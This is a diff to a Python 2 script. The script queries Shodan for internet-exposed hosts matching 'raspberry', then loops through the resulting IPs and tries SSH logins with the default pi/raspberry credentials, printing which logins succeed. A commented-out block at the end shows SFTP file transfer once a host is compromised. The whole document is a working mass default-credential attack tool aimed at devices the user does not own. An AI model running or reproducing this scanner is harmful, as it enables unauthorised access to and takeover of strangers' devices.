@@ -1,21 +1,26 @@
-import os
-import sys
-import paramiko
 import shodan
 import argparse
+import os,sys
+import paramiko,socket
+
 parser = argparse.ArgumentParser()
-parser.add_argument("filenm", help="Source file", type=str)
+parser.add_argument('input', help='Source file', type=str, nargs='?',default='raspberry_ip.txt')
 args = parser.parse_args()
-target_file = str(args.filenm).replace(' ','')
+target_file = str(args.input).replace(' ','')
+
+if target_file=='raspberry_ip.txt':
+        print '\n\n'+'  Source File: %s (Default)'%target_file
+else:
+        print '\n\n'+'  Source File: %s (input)'%target_file
 
 
 #Define Shodan Api key--
-shodan_api = "Your Api Key Here"
+shodan_api = ''
 
 
 #Check if target list is available or not.
 if(os.path.isfile('./'+target_file)==False or os.path.getsize(target_file)==0):
-        print "File not found\nCreating file using Shodan..."
+        print "  File not found\n  Creating file using Shodan..."
         api = shodan.Shodan(shodan_api)
         try:
                 results = api.search('raspberry')
@@ -23,9 +28,12 @@ if(os.path.isfile('./'+target_file)==False or os.path.getsize(target_file)==0):
                         for addr in results['matches']:
                                 ras.write(addr['ip_str']+'\n')
                 ras.close()
+                print '  File \"%s\" created!'%target_file
         except shodan.APIError, e:
                 print 'Error: %s'%e
                 sys.exit()
+        except:
+                raise
 
 #Variables
 log_filename = 'paramiko_log.txt'
@@ -33,51 +41,57 @@ i = 0
 success = 0
 err = 0
 
-#Main program:
+print '\n'+'  {:-^46}'.format('Start')+'\n'
+
+#Main loop:
 while (True):
-        print "\n----------\nIteration - %d\nTotal Successful ip(s) - %d"%(i,success)
         with open(target_file,'r') as f:
                 lines = f.readlines()
         try:
                 server = lines[i]
-                print "\n----- Now testing - %s -----"%server
+                server = server.strip()
                 username = 'pi'
                 password = 'raspberry'
-                #server, username, password = ('196.68.212.43', 'pi', 'raspberry')
-                try:
-                        ssh = paramiko.SSHClient()
-                        paramiko.util.log_to_file(log_filename)
-                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                        #In case the server's key is unknown,
-                        #we will be adding it automatically to the list of known hosts
-                        #Loads the user's local known host file.
-                        ssh.load_host_keys(os.path.expanduser(os.path.join("~", ".ssh", "known_hosts")))
-                        #Connection initiated..., set the value for timeout 
-                        conn = ssh.connect(server, username=username, password=password, timeout=40)
-                        if conn is None:
-                                print "Connection success for IP-%s\ngoing to next ip"%server
-                                success = success + 1                             
-                                with open('success_ip.txt','a') as fl:
-                                        fl.write(server)
-                                fl.close()                                                                
-                                i = i+1
-                                ssh.close()
-                        else:
-                                print "IP-%s failed!,going to next ip..."%server
-                                i = i+1  
+                ssh = paramiko.SSHClient()
+                paramiko.util.log_to_file(log_filename)
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                #In case the server's key is unknown,
+                #we will be adding it automatically to the list of known hosts
+                #Loads the user's local known host file.
+                ssh.load_host_keys(os.path.expanduser(os.path.join("~", ".ssh", "known_hosts")))
+                try:                        
+                        #Connection initiated... set the value for timeout 
+                        ssh.connect(server, username=username, password=password, timeout=5)
+                        print '%3d : %7s : %5s'%(i,server,'Success!')
                         f.close()
-                        last.close()                        
+                        ssh.close()
+                        i=i+1
+                except  paramiko.AuthenticationException:                        
+                        print '%3d : %7s : %5s'%(i,server,'Authentication Failed!')
+                        i=i+1
+                        f.close()                
+                except socket.error:
+                        print '%3d : %7s : %5s'%(i,server,'Connection Failed!')
+                        i=i+1
+                        f.close()
                 except KeyboardInterrupt:
-                        print "\n\nExiting..."
+                        print '\n\n  {:-^46}'.format('Interrupted!')+'\n'
+                        f.close()
                         sys.exit()
                 except:
-                        #print "some error occurred, going to next ip..."
-                        i = i+1
                         f.close()
+                        raise
+        except KeyboardInterrupt:
+                print '\n\n  {:-^46}'.format('Interrupted!')+'\n'
+                sys.exit()
+        except IndexError:
+                f.close()
+                print "\n  Total successful IPs -- %d"%success
+                print '  {:-^46}'.format('Finished')+'\n'
+                sys.exit()
         except:
                 f.close()
-                print "-------- Finished --------"
-                sys.exit()
+                raise
 
 '''
 #Error handling---
@@ -92,4 +106,5 @@ sftp = ssh.open_sftp()
 sftp.get(remote_path, local_path)
 sftp.put(local_path, remote_path)
 sftp.close()
-ssh.close()'''
+ssh.close()
+'''
